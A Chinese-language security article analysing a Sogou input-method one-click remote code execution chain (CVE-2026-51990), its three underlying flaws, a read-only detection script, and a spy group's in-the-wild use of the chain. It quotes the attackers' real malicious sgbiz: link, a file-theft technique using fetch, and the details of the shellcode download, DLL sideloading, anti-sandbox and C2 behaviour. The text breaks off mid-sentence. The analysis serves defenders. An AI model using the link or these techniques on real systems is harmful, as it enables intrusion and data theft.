---
title: 【2026hvv】搜狗一键RCE漏洞之三个\"各自不算致命\"的缺陷如何变成 Critical，文章详谈~【附验证exp】
url: https://mp.weixin.qq.com/s/2TyIwuivZQ6wJ7Mm-E3RYw
source: Doonsec's feed
date: 2026-09-15
fetch_date: 2026-09-16T07:00:46.811645
---

# 【2026hvv】搜狗一键RCE漏洞之三个\"各自不算致命\"的缺陷如何变成 Critical，文章详谈~【附验证exp】

# 【2026hvv】搜狗一键RCE漏洞之三个"各自不算致命"的缺陷如何变成 Critical，文章详谈~【附验证exp】

FL\_Clover
FL\_Clover

网络安全007

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

一、漏洞事件概述

    2026年4月，Gen Digital 威胁实验室在追踪 UNC3569 间谍组织活动时，发现其初始入侵载体并非传统钓鱼或供应链污染，而是国内装机量极高的搜狗输入法。经深入逆向与复现，研究人员确认该软件存在一条可被"单次点击"触发的完整远程代码执行链，MITRE 于2026年7月10日正式分配编号 CVE-2026-51990。

    该漏洞的本质是三个独立安全缺陷的致命组合：自定义 URI 协议对命令行参数缺乏校验、内嵌浏览器页面可被劫持跳转至任意外部地址、以及一个六年未更新且主动关闭沙箱保护的 Chromium 内核。攻击者只需诱导用户点击一个特制链接，即可在受害者机器上以当前登录用户权限静默执行任意代码，全程无需额外交互或权限提升。

    这并非理论风险——UNC3569已在真实攻击中利用该漏洞投放 GRAYRABBIT 模块化后门，目标覆盖东亚及东南亚地区的政府、教育、科技与金融关键基础设施。

![](https://mmbiz.qpic.cn/mmbiz_png/IGws6hSXN0xWV2SA9iaF3wNROdl9UDpmEkg7QTpGiaVMuQlGCbnxm4arZLPr54u8jPX3fKQskw3lo0OWpRJS6mpgiaABEKB5PKboOgSdfplkx4/640?wx_fmt=png&from=appmsg)

关键时间线

* 2026-04-09：Gen 向腾讯提交完整漏洞报告（含90天协调披露窗口）
* 2026-04-10：腾讯安全响应中心确认接收并启动评估
* 2026-04-21：修复版本 16.3.0.3498 通过自动更新全量推送（从报告到修复仅12天）
* 2026-07-10：MITRE 正式分配 CVE-2026-51990
* 2026-07月中下旬：国内主流安全厂商集中发布技术分析，推动国内用户感知与修复
* 2026-09-10：漏洞细节逐渐公开

二、漏洞影响范围

* 受影响产品：Windows 版搜狗输入法，版本号 < 16.3.0.3498
* 修复版本：16.3.0.3498（2026-04-21 自动更新推送）在协议处理层封堵该攻击路径，但内嵌浏览器组件本身仍未升级
* 影响规模：搜狗输入法国内月活用户超数亿，理论上所有未及时更新的 Windows 终端均暴露于攻击面之下
* 现实威胁等级：高危 / 已在野利用。攻击方为 UNC3569，最终载荷为 GRAYRABBIT 后门，具备远程命令执行、交互式 Shell、文件窃取、系统信息回传及动态插件加载等完整间谍能力
* 行业聚焦：政府、教育、科技、金融四大领域为已知重点目标，地域集中于东亚与东南亚
* 触发条件：受害者只需点击一个特制的 sgbiz: 协议链接（可通过钓鱼邮件、即时消息或网页嵌入投递），无需其他交互即可被植入后门

三、漏洞技术要点分析

* 漏洞链的本质：三0个"各自不算致命"的缺陷如何变成 Critical

这条链的价值在于它揭示了一个非常典型的"信任边界错位"问题

| 环节 | 缺陷类型 | 单独看严重性 | 在链中的作用 |
| --- | --- | --- | --- |
| ① `biz_helper.exe` | 参数注入（CWE-88，Argument Injection）；输入校验不对称 | 中（只能启动白名单内的搜狗程序） | 把"外部不可信输入"变成"内部进程的命令行" |
| ② `SGMyInput.exe` | 不受限的重定向 / 导航（CWE-601）；把命令行参数当作可信配置 | 中（需要一个能渲染任意 URL 的浏览器才有意义） | 把命令行参数变成"浏览器地址栏" |
| ③ `SGWebRender.exe` | 过时组件（CWE-1104）+ 关闭沙箱（CWE-693）+ 关闭同源策略（CWE-346） | 高（但需要"能加载攻击者页面"这一前提） | 把"加载一个网页"变成"以用户权限执行任意代码" |

关键洞察：每一环的开发者都做了"局部合理"的决策，但没有人对端到端的信任流负责。

* ①的开发者认真校验了 module（防路径穿越），因为他把"启动哪个程序"视为危险操作；但他默认"启动自家程序、传什么参数"是安全的——这是一个典型的"参数即代码"误判。在 Windows 生态中，命令行参数的危险性长期被低估（rundll32、regsvr32、mshta、InstallUtil 等 LOLBin 全都靠参数驱动）。
* ②的开发者把 -url 视为一个"内部调试/运营参数"（例如从弹窗、皮肤推荐位跳转到指定活动页），因此不做校验；他默认只有自家可信组件才会传这个参数。但①的存在直接打破了这个假设。
* ③的开发者关闭沙箱、关闭 web security、允许 file 协议跨域读取，几乎肯定是为了让本地皮肤资源（file:// 或自定义 scheme）能正常加载与互访——这是 CEF 集成中最常见的"为了功能牺牲安全"的反模式。而 bDisableWebSecurity 被硬编码为 1、不做成配置项，说明这甚至不是一个可关闭的选项，而是架构假设。

这三者的组合产生了 CVSS 意义上的"范围变化"： 一个只能"渲染内部皮肤页面"的低权限组件，被提升为"任意外部 URL 的通用执行入口"。

* 为什么 param 未校验如此致命：skincenter 是唯一"有浏览器的页面"

    gendigital原文有一个非常精准的技术观察：SGMyInput.exe 的绝大多数 -page 值都创建原生 Win32 对话框，只有 skincenter 会实例化 CEF webview。

    这说明该二进制内部存在一个"能力孤岛"：一个配置工具里嵌了一个完整浏览器，而这个浏览器的存在只是为了展示一个网页版皮肤商店。从攻击面管理角度看，这是典型的"过度集成"：

* 一个 IME 配置程序不应该需要完整的 Chromium。
* 皮肤商店完全可以用系统 WebView2（Evergreen，由微软自动更新，默认启用沙箱）替代自捆绑的 CEF。
* 如果必须自捆绑 CEF，应当锁定并定期升级 libcef.dll，把它当作与 OpenSSL 同等级别的"需要持续打补丁的第三方密码学/网络组件"来管理。

    Chromium 80（2020年3月）落后约 60 个大版本，这个数字本身就意味着"利用代码是现货"。 攻击者不需要 0-day，不需要自研，只需要从公开 PoC 库里挑一个 2020–2021 年的 V8 漏洞。本案选用的 CVE-2021-38003（JSON.stringify 类型混淆，Chrome < 95.0.4638.69）正是 2021 年被广泛公开、有成熟 PoC 的经典 V8 类型混淆洞（TypeScript 类型混淆家族，与 CVE-2021-30551、CVE-2020-16040 同源）。"用六年前的现货 n-day 打六年前的引擎"——这就是效率最大化的攻击经济学。

* disable-web-security 的独立危害被严重低估

    即使不打通完整的 RCE 链，--disable-web-security + --allow-file-access-from-files + no\_sandbox 的组合本身就已构成高危。具体危害场景有以下方面：

1. 本地文件窃取（无需任何内存破坏漏洞）：攻击者只要能让 webview 加载一个自己的页面（修复前通过 sgbiz:；修复后仍可通过本地进程直接调用 SGMyInput.exe -page=skincenter -url=...），该页面就可以用 fetch('file:///C:/Users/x/AppData/...') 读取任意本地文件并通过 XHR 外传。因为同源策略已被关闭，且允许 file 协议跨源访问。
2. 内网横向侦察与数据窃取（SSRF-like）：关闭同源策略意味着页面可以对 http://192.168.x.x/、http://内网OA/、云元数据端点（169.254.169.254）发起带 Cookie/凭据的请求并读取响应。这在企业内网中价值极高。
3. 凭据/会话劫持：若用户在同一 CEF 实例中登录过任何搜狗/腾讯系服务，页面可直接读取其 storage 与发起已认证请求。

这三类危害都不需要 V8 漏洞利用，纯粹靠"配置不当"就能实现，而且不受本次修复的完整覆盖。

三个缺陷的意义以及具体细节

缺陷1：协议处理器参数注入（biz\_helper.exe）

    搜狗在 Windows 上注册了自定义 URI 协议 sgbiz:，由 biz\_helper.exe 负责解析分发。当处理 sg\_process 命令时，程序对 module 参数（要启动的可执行文件）做了严格校验——过滤路径穿越字符、限制长度、验证文件存在性；但对 param 参数（传递给目标程序的命令行参数）却仅做了一次 URL 解码便原样透传，没有任何白名单或过滤机制。攻击者由此可向任意合法的搜狗程序注入任意命令行参数。

缺陷2：内嵌 WebView unrestricted URL 导航（SGMyInput.exe）

    攻击者选择启动配置程序 SGMyInput.exe，并注入 -page=skincenter -url=<恶意地址>。skincenter（皮肤商店）是该程序中唯一会创建 CEF（Chromium Embedded Framework）内嵌浏览器的页面。当 OnWebViewIsReady 回调检测到命令行传入了自定义 URL 时，会直接导航过去——不校验协议类型（http/https/file/javascript 均可）、不检查域名白名单，完全信任外部输入。

缺陷3：过时且"裸奔"的浏览器内核（SGWebRender.exe）

    内嵌的 libcef.dll 版本为 CEF 80.1.16 / Chromium 80.0.3987.163，发布于2020年3月，落后当时稳定版约60个大版本，缺失六年间数百个已知 CVE 的补丁。更严重的是安全配置被硬编码削弱：

* no\_sandbox = TRUE：完全禁用 Chromium 沙箱，渲染进程一旦被攻破即可直接触达操作系统；
* disable-web-security：关闭同源策略，页面可跨域读取任意资源；allow-file-access-from-files：允许页面读取本地文件；
* 上述开关由 bDisableWebSecurity 标志控制，且该标志在初始化时被硬编码为1，无法通过配置关闭。

四、漏洞 EXP / PoC 情况

完整的利用链如下：

1. 攻击者构造一条 sgbiz: URL 并投递给受害者（例如通过钓鱼邮件、即时消息或网页链接）。
2. 受害者点击链接，Windows 将其交给 biz\_helper.exe。它解析 sgbiz: URL，校验 module 参数（sgmyinput.exe 是合法的搜狗可执行文件，因此通过校验），并把未经校验的 param 值作为命令行参数传下去。
3. SGMyInput.exe 以 -page=skincenter 和 -url=https://attacker.com/exploit.html 启动。skincenter 页面创建 CEF webview，OnWebViewIsReady 函数在没有任何校验的情况下把浏览器导航到攻击者的 URL。
4. SGWebRender.exe（运行 Chromium 80，无沙箱，同源策略已关闭）加载攻击者的页面。页面中包含针对过去六年内任意已知 V8 漏洞的 JavaScript 利用代码。
5. 由于没有沙箱，该利用直接获得系统级代码执行。攻击者现在可以做当前用户能做的任何事。

    目前公开渠道等流出的 poc.py 是一个非破坏性的本地检测脚本，并不包含真实的利用代码，其功能是判断本机是否处于受影响状态：

* 检查注册表 HKCR\sgbiz 是否存在（即攻击面是否存在）；
* 通过注册表标准卸载路径定位搜狗安装目录，读取 version.ini 中的产品版本号；
* 读取 SGWebRender.exe / SGMiniBrowserHelperHost DLL 的文件版本资源，确认内嵌引擎代际；
* 将产品版本与修复版本 16.3.0.3498 比对，输出 VULNERABLE / PATCHED / NOT AFFECTED 结论，并以退出码区分（1=存在漏洞，0=安全）。
* 脚本仅在 Windows 平台运行，声明只做只读检查，不会构造恶意链接、不启动搜狗进程、不修改任何内容，且标注仅限授权安全评估使用。真正的武器化利用代码（V8 类型混淆 EXP + shellcode + GRAYRABBIT）目前仅存在于 UNC3569 的实战攻击中，未被公开发布。

脚本检测可参考：

```
作者：Rubby2001脚本链接https://github.com/Rubby2001/CVE-POCS/blob/main/CVE-2026-51990/poc.py
```

目前在野漏洞 Exp

示例：UNC3569 投递的恶意链接

```
sgbiz:sg_process?module=sgmyinput.exe&param=-page%3Dskincenter%20-url%3Dhttps%253A%252F%252Fnoht1ng.top%252Ffuckujjbangx.html
```

五、UNC3569 攻击链实战

UNC3569 实战利用细节

1. 投递形如下链接；

   ```
   sgbiz:sg_process?module=sgmyinput.exe&param=-page=skincenter -url=https://noht1ng.top/....html
   ```
2. 落地页触发 CVE-2021-38003（V8 JSON.stringify 类型混淆漏洞，影响 Chrome 95 之前版本），借助 "the hole" 值破坏 V8 内部 Map 结构，获得堆上任意读写能力；
3. 定位 WebAssembly 实例对应的 RWX 内存页，写入921字节的 x64 下载器 shellcode 并跳转执行；
4. shellcode 通过 PEB 遍历 + ROR8 哈希解析 API，调用 URLDownloadToFileA 从阿里云香港节点（8.218.50[.]207）拉取三个文件到 C:\Users\Public\Documents\：正版 7z.exe、伪装成 7z.dll 的恶意加载器（内部名 boy.dll）、加密载荷文件 p；
5. 以 CREATE\_NO\_WINDOW 启动 7z.exe 执行一条无意义的压缩命令，实为触发 DLL 侧加载，恶意 7z.dll 抢先接管执行流；
6. 加载器内置反沙箱逻辑（统计进程数是否少于50个来判断沙箱环境，并参与 XOR 解密 key 计算），使用 NTFS 备用数据流（ADS）技术自删除以规避行为日志，并通过线程池 API（而非易被 Hook 的 CreateThread）执行解密后的载荷；
7. 最终载荷为 x64 版 GRAYRABBIT 后门（内部名 core.dll），采用反射式 PE 加载，导出 CoreClientInstall/CoreClientStart。C2 通信使用裸 TCP 443 端口连接 mail[.]uaiubifas[.]top，每帧固定4096字节并以静态密钥 m5b1u3 做 RC4 加密。支持命令执行、交互式反向 Shell、文件上传下载、系统信息收集（IP/主机名/用户名/进程信息）以及从 C2 动态下发插件扩展能力。

UNC3569 在这条链上展示了几个值得防御方学习细节点如下

(a) 下载器内联化（RABBITFUR → shellcode 内嵌）

    把原本独立的下载器 RABBITFUR 的功能压缩进 921 字节的 V8 利用 shellcode，减少了磁盘上的一个可疑 PE 落地点，也减少了一次进程创建事件。检测含义：不要只依赖"可疑 PE 落地 + 进程创建"的检测范式，要检测浏览器渲染进程自身的异常网络行为（SGWebRender.exe 发起对非搜狗域名的 HTTP 请求，或发起 URLDownloadToFileA）。

(b) 侧载宿主的选择：7z.exe

    使用合法签名的 7-Zip 作为侧载宿主（T1574.002），并通过一个语义无害的压缩命令来触发它。命令 7z.exe a p.7z p 在命令行审计中看起来完全正常。检测含义：命令行内容不可信，应检测加载的 DLL 的签名状态与路径——即"由 C:\Users\Public\Documents\ 这类世界可写目录加载的、无签名或签名异常的 7z.dll"。C:\Users\Public\Documents\ 这个落地点本身就是强 IOC。

(c) 反沙箱：进程计数 + 浮点确定性运算参与密钥派生

    最巧妙的部分：它不是"检测到沙箱就退出"，而是"检测到沙箱就解出垃圾数据"。

* 传统的"检测即退出"（if (isSandbox) return;）会在行为日志中留下明显的早退特征，且沙箱厂商容易通过打补丁绕过。
* 这里把沙箱检测结果混入解密密钥，导致在沙箱中载荷解密成随机字节，随后的反射加载会失败/崩溃——分析者看到的是一个"解密失败"的假象，而非"反沙箱触发"。这是一种"隐式反分析"。
* 同时用一段 50,000 次迭代的 sqrt/乘法/倒数浮点运算产生一个"看起来像环境指纹、实际是常量"的值，既能拖慢动态分析，又能在静态分析时误导分析师以为存在硬件/时间绑定。

检测含义：对样本做自动化脱壳时，需要保证沙箱环境的进程数 ≥ 50（预置填充进程），否则永远拿不到正确载荷。这是一条非常实用的沙箱运营建议。

(d) 执行方式：Thread Pool API 而非 CreateThread

    CreateThreadpoolWork / SubmitThreadpoolWork 是 EDR 挂钩密度远低于 CreateThread / CreateRemoteThread 的路径。检测含义：把线程池 API 纳入 RWX 内存分配后的执行监控。

(e) 自删除：NTFS ADS 重命名 + FileDispositionInfo

    通过 SetFileInformationByH...